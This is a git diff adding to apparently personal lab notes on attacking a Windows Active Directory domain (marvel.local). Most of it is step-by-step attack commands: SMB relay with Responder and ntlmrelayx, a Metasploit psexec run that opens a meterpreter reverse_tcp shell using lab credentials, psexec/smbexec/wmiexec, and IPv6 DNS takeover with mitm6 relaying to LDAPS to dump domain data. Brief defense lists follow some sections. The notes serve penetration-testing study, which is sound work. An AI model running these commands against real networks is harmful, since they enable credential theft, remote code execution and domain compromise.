@@ -85,4 +85,98 @@ in punisher machine , go to quick access , type the \\ipaddress , got a error
 
 we will SAM hash.get the hash and crack it
 
--------------------------------------
+----------------------------------------SMB Relay attack Demonstration part 2------------------------------
+$responder -I eth0 -rdwv
+turn off smb and http
+
+$python ntlmrelayx.py -tf targets.txt -smbb2support -i OR -i
+
+-i - interactive shell
+
+nc 127.0.0.1 11000
+#help
+
+we are in the smb shell
+we already created the share file
+
+#shares
+#use C$
+ls
+#use ADMIN$
+
+-E - EXECUTE via msfvenom
+
+------------------------------------------------SMB Relay Attack Defenses-----------------------------------------
+1.Enable SMB Signing on all devices
+2.Disable NTLM authentication on network
+3.Local admin restriction
+
+-----------------------------------------------Gaining shell access----------------------------------------------
+
+$msconsole
+$search psexec
+$use 10
+$options
+$set rhosts 192.168.57.141
+$set smbdomain marvel.local
+$set smbpass Password1
+$set smbuser fcastle
+$options
+$set payload windows/x64/meterpreter/reverse_tcp
+$options
+$set lhost eth0
+$run
+
+$psexec.py -help
+$psexec.py marvel.local/fcastle:Password@192.168.57.141
+$smbexec.py
+$wmiexec.py
+
+Try different tools to exploit , don't stop at the first go itself.
+
+--------------------------------------------------------------IPv6 ATTACKS-------------------------------
+ipV6 ATTACK abuses the default IPv6 configuration in windows networks to spoof DNS replies by acting as a malicious DNS 
+server and redirect traffic to an attacker specified endpoint.
+---------------------------------------------------------Installing mitm6---------------------------------
+download and install fox-it/mitm6
+
+$cd /opt/
+$git clone github repo
+$cd mitm6
+$ls
+$pip2 install requriment.txt
+------------------------------------------------------------Setting up LDAPS----------------------------------
+open server manager -> manage -> add roles and features -> next -> next -> next 
+-> click on AD CS ->Add features ->next ->restart ->install
+
+top right yellow symbol -> configure AD CS -> NEXT ->CERTIFICATION AUTHORITY ->NEXT - FINISH
+
+---------------------------------------------------------IPv6 DNS TAKEOVER VIA MITM6---------------------
+$mitm6 -d marvel.local
+$ntlmrelayx.py -6 -t ldaps://192.168.57.140 -wh fakewpad.marvel.local -l lootme
+
+
+
+Restart the punisher machine
+$cd /lootme
+$firefox domain_users_by_group.html
+
+we succeed with the system.
+
+https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
+
+---------------------------------------------------------IPv6 attack defenses-------------------------------------
+1.Disabling the IPV6
+2.not using WPAD internally , disable the winhttpautoproxysvc service
+------------------------------------------------------PASS BACK ATTACKS------------------------------------
+https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack
+
+----------------------------------------------------OTHER ATTACK VECTORS AND STRATEGIES-------------------------
+
+*MITM6 & RESPONDER
+*RUN SCANS TO GENERATE TRAFFIC
+*LOOK FOR WEBSITES IN SCOPE(http_version)
+*LOOK FOR DEFAULT CREDENTIALS ON WEB LOGINS PRINTERS,JENKINS ETC
+
+
+
